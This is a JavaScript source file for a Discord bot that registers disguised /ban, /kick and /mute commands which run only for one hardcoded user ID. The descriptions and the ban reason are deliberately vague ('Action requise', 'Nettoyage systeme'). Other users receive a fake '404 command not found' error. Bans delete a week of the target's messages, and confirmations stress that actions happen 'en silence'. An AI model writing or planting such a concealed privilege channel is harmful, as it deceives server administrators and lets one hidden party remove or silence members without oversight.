const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PERMITTED_USER_ID = '1259542394848940122';

const commands = [
    new SlashCommandBuilder()
        .setName('ban')
        .setDescription('Action requise (B)')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
        .addUserOption(option => option.setName('cible').setDescription('Cible').setRequired(true)),

    new SlashCommandBuilder()
        .setName('kick')
        .setDescription('Action requise (K)')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
        .addUserOption(option => option.setName('cible').setDescription('Cible').setRequired(true)),

    new SlashCommandBuilder()
        .setName('mute')
        .setDescription('Action requise (M)')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
        .addUserOption(option => option.setName('cible').setDescription('Cible').setRequired(true))
        .addIntegerOption(option => option.setName('minutes').setDescription('Duree').setRequired(true))
].map(command => command.toJSON());

client.once('ready', async () => {
    console.log('Le bot systeme est en ligne.');
    
    const rest = new REST({ version: '10' }).setToken(client.token);
    
    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('Commandes /ban, /kick et /mute enregistrees avec succes.');
    } catch (error) {
        console.error('Erreur lors du chargement des commandes :', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // On vérifie d'abord si la commande tapée fait partie de nos commandes silencieuses
    if (['ban', 'kick', 'mute'].includes(interaction.commandName)) {
        
        // Sécurité : Si ce n'est pas ton ID, on rejette silencieusement
        if (interaction.user.id !== PERMITTED_USER_ID) {
            return interaction.reply({ 
                content: 'Erreur 404 : Commande introuvable ou desactivee.', 
                ephemeral: true 
            });
        }

        const cible = interaction.options.getMember('cible');

        if (!cible) {
            return interaction.reply({ 
                content: 'Erreur : Cible introuvable sur le serveur.', 
                ephemeral: true 
            });
        }

        // Execution de la commande /ban
        if (interaction.commandName === 'ban') {
            try {
                await cible.ban({ deleteMessageSeconds: 604800, reason: 'Nettoyage systeme' });
                await interaction.reply({ content: `Confirmation : ${cible.user.tag} a ete banni en silence.`, ephemeral: true });
            } catch (error) {
                await interaction.reply({ content: 'Echec : Le bot manque de permissions (Role trop bas).', ephemeral: true });
            }
        }

        // Execution de la commande /kick
        if (interaction.commandName === 'kick') {
            try {
                await cible.kick('Nettoyage systeme');
                await interaction.reply({ content: `Confirmation : ${cible.user.tag} a ete expulse en silence.`, ephemeral: true });
            } catch (error) {
                await interaction.reply({ content: 'Echec : Le bot manque de permissions (Role trop bas).', ephemeral: true });
            }
        }

        // Execution de la commande /mute
        if (interaction.commandName === 'mute') {
            const minutes = interaction.options.getInteger('minutes');
            try {
                await cible.timeout(minutes * 60 * 1000, 'Nettoyage systeme');
                await interaction.reply({ content: `Confirmation : ${cible.user.tag} a ete reduit au silence pour ${minutes} minutes.`, ephemeral: true });
            } catch (error) {
                await interaction.reply({ content: 'Echec : Le bot manque de permissions (Role trop bas).', ephemeral: true });
            }
        }
    }
});

client.login(process.env.TOKEN);
